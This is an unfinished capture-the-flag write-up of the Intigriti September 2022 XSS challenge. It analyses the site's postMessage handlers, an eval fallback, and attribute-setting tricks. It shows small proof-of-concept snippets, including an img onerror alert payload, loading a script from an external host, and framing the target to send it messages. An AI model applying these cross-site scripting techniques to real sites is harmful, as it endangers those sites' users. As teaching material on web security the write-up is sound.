not finished writing! typos/grammar unchecked


# Intigrity September 2022 Challenge
###### writeup by [@h43z](https://twitter.com/h43z)

```
For best learning effect always try to solve on your own first! 
If you hit a dead end, 
read writeup until you get new inspiration on how to proceed and stop reading further. 
Repeat until sucessful solve.
```

https://challenge-0922.intigriti.io/

What does the website do? There is just one `<input>` that where you enter text.
On `ENTER` or on clicking 🔮 the Magic 8 Ball will tell you
some answer to your input (question).

Let's check the code. We see that that `magic.php` is embedded as an iframe.
```
<iframe id="ball" src="https://challenge-0922.intigriti.io/challenge/magic.php" sandbox="allow-scripts allow-same-origin"></iframe>
```
This iframe will receive a message (the question) via `postMessage` with the 
`buttonClick()` function that get's triggered on submission.
```
if (document.querySelector('#question').value){
        document.querySelector('#ball').contentWindow.postMessage({
          question: document.querySelector('#question').value
        }, '*');
      }
```
Now onto `magic.php`. What does it do when it receives a message from `postMessage`.
```
addEventListener('message', e => {
  if ('question' in Object(e.data)){
    fetch('https://challenge-0922.intigriti.io/challenge/api.php?question=' + encodeURIComponent(e.data.question))
      .then(e => e.text())
      .then(e => {
        let resp;
        try{
          resp = JSON.parse(e);
        } catch (_) {
          resp = eval(e);
        }
        shake(resp);
    });
```
It makes another request to `https://challenge-0922.intigriti.io/challenge/api.php?question=`
It tries to `JSON.parse()` the response of the endpoint and if the parsing throws an error
the reponse get's passed to `eval`... 

This screams to be investigated. Maybe we can influence the response somehow 
to include a payload from us.

What does this endpoint return? We open it in the browser and provide just
some random value for the question.

`https://challenge-0922.intigriti.io/challenge/api.php?question=asdf`
```
{"answer":"Signs point to yes"}
```
Okay. Doesn't seem to be anything reflected of interest here. This will get parsed
with 'JSON.parse' just fine and never reach the eval.

We should mess with the `question` parameter value for a while. Maybe some value
will lead to a more interesting response. Multiple things could lead to that.
A too long string, a number, too big number, special character. Anything that
could potentially break the the server side code that generates the response.

We try a few values.
```
https://challenge-0922.intigriti.io/challenge/api.php?question=99999999999999999999999
https://challenge-0922.intigriti.io/challenge/api.php?question=-99999999999999999999999
https://challenge-0922.intigriti.io/challenge/api.php?question=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
https://challenge-0922.intigriti.io/challenge/api.php?question='
https://challenge-0922.intigriti.io/challenge/api.php?question="

https://challenge-0922.intigriti.io/challenge/api.php?question=0
https://challenge-0922.intigriti.io/challenge/api.php?question
https://challenge-0922.intigriti.io/challenge/api.php?question[]=bbbbbbbb
```
The last 3 look promising. Eg. the `0` leads to
```
## Exception 'Question not found'

#0 /dev/urandom(856294826): setQuestion('"0"')
#1 /dev/urandom(1665290270): initAnonConfig('he2qj4nbcchvcf9md40pnfp28m', 'eyJhdHJhbE9iamVjdCI6WzYwMzA4MzMxOCwyMDEwNzkyMTU0LDE1NjMzMzQ4ODMsMTQ0MTIwMjQ2LDE1NDg5NzYyMTMsMjA1MjcwNTY5MiwxMzU5NjUxOTYwLDczMTI0ODg2MiwxNDg1OTMzODUzLDczNjc2NjA3Ml0sImNzcCI6IjU2NTRlMzFkNWZmMzM4M2MyMDE1Mjg5ZDYwNzEwOWEzIiwidXJhbmRvbUNvbnNpc3RlbmNlIjpbMTIzNzM2OTg3MywxODU5OTg5MjY0LDYxNzYzMjYxNiwzODg5MjQ0NTEsOTI4ODYyNTU0LDY4MTA1ODI5NCwxNTM4MDc4NDExLDExMzQ2NTc5MjEsMTgzNTM2MzQ1NSw5MDk3OTYwMjFdfQ==')
#2 /dev/urandom(1673362906): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', '"0"')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

Not providing any value for `question` to 
```
## Exception 'Question not found'

#0 /dev/urandom(1078983387): setQuestion('null')
#1 /dev/urandom(300753660): initAnonConfig('he2qj4nbcchvcf9md40pnfp28m', 'eyJhdHJhbE9iamVjdCI6WzYwMzA4MzMxOCwyMDEwNzkyMTU0LDE1NjMzMzQ4ODMsMTQ0MTIwMjQ2LDE1NDg5NzYyMTMsMjA1MjcwNTY5MiwxMzU5NjUxOTYwLDczMTI0ODg2MiwxNDg1OTMzODUzLDczNjc2NjA3Ml0sImNzcCI6IjU2NTRlMzFkNWZmMzM4M2MyMDE1Mjg5ZDYwNzEwOWEzIiwidXJhbmRvbUNvbnNpc3RlbmNlIjpbMTIzNzM2OTg3MywxODU5OTg5MjY0LDYxNzYzMjYxNiwzODg5MjQ0NTEsOTI4ODYyNTU0LDY4MTA1ODI5NCwxNTM4MDc4NDExLDExMzQ2NTc5MjEsMTgzNTM2MzQ1NSw5MDk3OTYwMjFdfQ==')
#2 /dev/urandom(281386763): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', 'null')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

And providing an Array to
```
## Exception 'Question not found'

#0 /dev/urandom(1707739064): setQuestion('["aaaaaaaa"]')
#1 /dev/urandom(903026658): initAnonConfig('he2qj4nbcchvcf9md40pnfp28m', 'eyJhdHJhbE9iamVjdCI6WzYwMzA4MzMxOCwyMDEwNzkyMTU0LDE1NjMzMzQ4ODMsMTQ0MTIwMjQ2LDE1NDg5NzYyMTMsMjA1MjcwNTY5MiwxMzU5NjUxOTYwLDczMTI0ODg2MiwxNDg1OTMzODUzLDczNjc2NjA3Ml0sImNzcCI6IjU2NTRlMzFkNWZmMzM4M2MyMDE1Mjg5ZDYwNzEwOWEzIiwidXJhbmRvbUNvbnNpc3RlbmNlIjpbMTIzNzM2OTg3MywxODU5OTg5MjY0LDYxNzYzMjYxNiwzODg5MjQ0NTEsOTI4ODYyNTU0LDY4MTA1ODI5NCwxNTM4MDc4NDExLDExMzQ2NTc5MjEsMTgzNTM2MzQ1NSw5MDk3OTYwMjFdfQ==')
#2 /dev/urandom(626561804): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', '["aaaaaaaa"]')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

In all three cases we seem to be getting some kind of debug output with lines
from the actual php code that has a lot of base64 encoded stuff. 
As that response is not going to be parsed correctly
into JSON. The `JSON.parse` call will throw an error and the whole response will get
passed to `eval`.

With the method of providing an Array `?question[]=aaaaaaaa` we are even able to
include some by us controlled characters as they will show up in the response at 
`...setQuestion('["aaaaaaaa"]')...`.

But the whole thing ain't javascript. And there is nothing we can do to turn it into
valid javascript code.

```
eval(`## Exception 'Question not found'

#0 /dev/urandom(1707739064): setQuestion('["aaaaaaaa"]') ...`)

```
Will always throw

```
Uncaught SyntaxError: '#' not followed by identifier
```

No matter what we inject we can't change the fact that the response starts
with `## Exception...`. This will always lead to an syntax error when feeded to
`eval`.

It seems this whole thing with the `eval` is a trap and dead end in the challenge.

The page continues with calling the function `shake()` with the parsed response.
```
  try{
    resp = JSON.parse(e);
  } catch (_) {
    resp = eval(e);
  }
  shake(resp);
```
That function then sends back data which seem to be some kind of action instructions 
to the `top` which in the regular case is the `index.php` page. 
```
top.postMessage({
  action: 'set',
  element: '#ball',
  attr: 'style',
  value: 'left: ' + rand() + 'px; top: ' + rand() + 'px;'
}, '*');
} else {
top.postMessage({
  action: 'result',
  value: resp.answer
}, '*');
 ```

Using `top` here is kind of a bug, it should instead be `parent`. 
Because if for example the challenge `index.php`
itself was within an iframe, this `magic.php` would
send the message to the uppermost `top` and not the `index.php`.

For us this bug has no real meaning as there is nothing interesting gained from
receiving whatever this code sends.

Aside from the `eval` in `magic.php` there is only one other place that somehow interacts
and manipulates the webpage. It's on main side `index.php`.
```
addEventListener('message', e => {
  switch(e.data.action){
    case 'set':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
      break;
    case 'delete':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.removeAttribute(e.data.attr, e.data.value));
      break;
    case 'get':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.getAttribute(e.data.attr, e.data.value));
      break;
    case 'count':
      [...document.querySelectorAll(e.data.element)].length;
      break;
    case 'result':
      document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
      break;
    default:
      console.log(e.data);
  }
});
```
Looking promising is the action 'result' that manpulates `innerHTML` of a tag
with the id of `#answer`. But before that it also sanitizes whatever it's placing
there by removing '>' and '<'. Those two characters would be crucial for any tag
injection with an event handler like the classic `<img/src/onerror=alert(1)>`.
Without `<` and `>` it's just becomes a textnode `img/src/onerror=alert(1)` and totally
useless.

This simple character filter seems robust `.replace(/<|>/g,'')` Not much wiggle room.
There is no way to trick this.

The other sections of this code where some DOM manipulation is taking place is
with the action `set` that uses `setAttribute` and `delete` with `removeAttribute`.
Two functions that let you set and remove any attribute from a tag.

`<tag someattribute=somevalue></tag>`

Fun fact removeAttribute only expects one parameter. The second one won't get used.
`s.removeAttribute(e.data.attr, e.data.value)`  but this bug in the code has zero consequences.

Setting an attribute could help with the `innerHTML` from the result action though.
```
  document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
```
Right now the html tag with the id of `answer` within the challenge site
is an h1 tag `<h1 id="answer" class="text-light">`.

But if there was a `<script>` tag with an id of `answer`  then one could indeed 
inject code into it. Without the need for '>' or '<', `innerHTML` would simply 
change the javascript code of the tag.

How would we get a `<script>` tag with an id of `answer`? We would make use of
the `setAttribute` of the set action and set it ourselves. 
But it would have to be a `<script>` that comes before the `<h1>` because
`document.querySelector('#answer')` only returns one and the first html element on the
page that it finds.

Before we continue with this idea let's do a quick proof of concept on how
the innerHTML behaves on `script` tags.
Here a short simulation of the situation we are in.

```
<html>

  <script id=answer></script>

  <script>
    document.querySelector('#answer').innerHTML = 'alert(1)'
  </script>

</html>
```
As you can see here https://editor.43z.one/xhs82 this would indeed pop an alert.


The only problem is that the script tag we would work with is this one from the
challenge site.

```
</head>
<body>
  <script nonce="46512fdd35b5ad382767954b3f0c6f1e">
    fetch('https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.0/css/bootstrap.min.css')
    ....
  </script>
```
Does changing the `innerHTML` still work if the `<script>` tag is not empty?
We test it by changing our little proof of concept.
```
<html>

  <script id=answer>
    console.log(8)
  </script>

  <script>
    document.querySelector('#answer').innerHTML = 'alert(1)'
  </script>

</html>
```
https://editor.43z.one/bru59 and Unfortunately it doesn't. No `alert` is 
executed.  it just runs the 'console.log(8)'. Looks like the `innerHTML` path 
wouldn't work in our case.

It's starting to look like, whatever the solution to this challenge is it must be solvable 
by utilizing `setAttribte` and/or `removeAttribute`. And those two 
functions must be acting on some of the html tags already present in the page 
as there is no way to add new ones.

The list of interesting tags already present in the page is short. It's
'<iframe>' and '<script>'. By the way, beforehand we forgot to test the obvious thing first.
Changing the `src` attribute on the `script` tag. We maybe suspect now that it will
be similar to the innerHTML situation and dynamically changing the content will
only work if it's empty in the first place. But it's always better to check!

```
<html>
  <script></script>
  <script>
    document.querySelector('script').src = 'https://f.43z.one/a.js'
  </script>
</html>
```
When it's empty, it works.

```
<html>
  <script>/*just a js comment*/</script>
  <script>
    document.querySelector('script').src = 'https://f.43z.one/a.js'
  </script>
</html>
```
If it's non empty, it doesn't. But hey, we checked!

The `<iframe>` is the last interesting tag left. Reading through it's MDN page
https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe the most intersting
attributes seem to be `src` and `srcdoc`. Both let you control the actual content of the 
`iframe`.

Maybe this is a good point to do a reality check before we continue exploring.
So far we run on a few assumptions which is fine but let's make sure we can fulfill
them.

The big one was that we were even able to reach this part of the code
```
addEventListener('message', e => {
  switch(e.data.action){
    case 'set':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
      break;
    case 'delete':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.removeAttribute(e.data.attr, e.data.value));
      break;
    case 'get':
      [...document.querySelectorAll(e.data.element)].forEach(s => s.getAttribute(e.data.attr, e.data.value));
      break;
    case 'count':
      [...document.querySelectorAll(e.data.element)].length;
      break;
    case 'result':
      document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
      break;
    default:
      console.log(e.data);
  }
});
```

How would we as attacker trigger any of those cases. The messages come from the
`magic.php` page. What's important to realize is that any page can send another page
messages as long as it has a window reference of the receiver.

And how do you get such a reference you might ask. Two ways, either use the
javascript `winref = open('//challenge-0922.intigriti.io')` which need user interaction 
to be triggered or embed it in an iframe.

We will do the latter.
```
<iframe id=i src="https://challenge-0922.intigriti.io"></iframe>
<script>
  // document.querySelector('iframe').contentWindow 
  // document.getElementById('i').contentWindow
  // window.i.contentWindow
  // or simply
  // i.contentWindow 
  // all now hold a window reference to the embedded page
</script>
```
Now we can use `postMessage` to send it any message.
```
<iframe id=i src="https://challenge-0922.intigriti.io"></iframe>
<script>
  i.contentWindow.postMessage('hello', '*')
</script>
```

